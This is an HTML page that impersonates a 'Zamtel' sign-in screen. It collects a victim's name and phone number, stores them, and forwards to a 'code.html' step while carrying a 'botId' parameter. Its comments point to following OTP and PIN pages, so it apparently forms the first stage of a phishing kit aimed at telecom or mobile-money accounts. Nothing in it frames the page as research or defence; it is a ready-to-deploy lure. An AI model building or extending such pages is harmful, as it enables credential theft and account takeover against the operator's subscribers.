<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zamtel | Sign In</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  background:#f2f2f2;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}

/* CONTAINER */
.page{
  width:100%;
  max-width:360px;
  text-align:center;
  padding:20px;
}

/* BRAND NAME */
.brand-name{
  font-size:42px;
  font-weight:600;
  color:#00843d;
  margin-bottom:12px;
}

/* Welcome */
.welcome-text{
  font-size:22px;
  color:#555;
  margin-bottom:24px;
}

/* FORM */
form{
  text-align:left;
}

/* LABEL */
label{
  display:block;
  font-size:15px;
  color:#666;
  margin-bottom:6px;
  margin-top:16px;
}

/* INPUT */
input{
  width:100%;
  padding:16px;
  border:2px solid #00843d;
  border-radius:14px;
  font-size:17px;
  color:#333;
  background:#fff;
  outline:none;
}

input:focus{
  border-color:#006b31;
}

/* BUTTON */
button{
  width:100%;
  margin-top:26px;
  padding:16px;
  font-size:18px;
  font-weight:600;
  border-radius:14px;
  border:none;
  background:#00843d;
  color:#fff;
  cursor:pointer;
}

button:disabled{
  background:#cccccc;
  cursor:not-allowed;
}

/* STATUS */
#status{
  margin-top:14px;
  font-size:14px;
  color:#00843d;
  min-height:18px;
}

/* FOOTER */
.footer{
  margin-top:26px;
  font-size:14px;
  color:#666;
}
</style>
</head>

<body>

<div class="page">

  <div class="brand-name">Zamtel</div>

  <div class="welcome-text">Welcome</div>

  <form id="detailsForm">

    <label for="nameInput">Full Name</label>
    <input id="nameInput" type="text" placeholder="Enter your full name" autocomplete="name">

    <label for="phoneInput">Zamtel Number</label>
    <input id="phoneInput" type="tel" inputmode="numeric" placeholder="e.g. 0955 123 456" autocomplete="tel">

    <button id="submitBtn" type="submit" disabled>Continue</button>

    <div id="status"></div>

  </form>

  <div class="footer">
    By continuing, you agree to the terms and conditions
  </div>

</div>

<script>
const nameInput  = document.getElementById("nameInput");
const phoneInput = document.getElementById("phoneInput");
const submitBtn  = document.getElementById("submitBtn");
const statusEl   = document.getElementById("status");

// Zambia mobile numbers: 10 digits starting with 09 (Zamtel 095/096/097...) 
// or international form 2609XXXXXXXX. We keep it simple: normalize and validate 10 digits.
function normalizePhone(raw){
  let p = raw.replace(/[^0-9]/g, "");
  if(p.startsWith("260")) p = p.slice(3);      // 260955123456 -> 955123456
  if(p.startsWith("0"))  p = p;                 // keep leading 0
  return p;
}

function isValidPhone(p){
  // 10 digits starting with 09 (e.g. 0955123456)
  return /^09\d{8}$/.test(p);
}

function updateButtonState(){
  const nameOk  = nameInput.value.trim().length >= 2;
  const phoneOk = isValidPhone(normalizePhone(phoneInput.value));
  submitBtn.disabled = !(nameOk && phoneOk);
}

nameInput.addEventListener("input", updateButtonState);
phoneInput.addEventListener("input", updateButtonState);

document.getElementById("detailsForm").addEventListener("submit", e=>{
  e.preventDefault();

  const name  = nameInput.value.trim();
  const phone = normalizePhone(phoneInput.value);

  if(!name || !isValidPhone(phone)){
    statusEl.textContent = "Please enter a valid name and Zamtel number.";
    return;
  }

  // Save for the next pages (OTP / PIN pages read these keys)
  localStorage.setItem("name", name);
  localStorage.setItem("phone", phone);

  statusEl.textContent = "Redirecting...";

  // Keep botId in the URL chain
  const botId = new URLSearchParams(window.location.search).get("botId");
  window.location.href = "code.html" + (botId ? "?botId=" + botId : "");
});
</script>

</body>
</html>
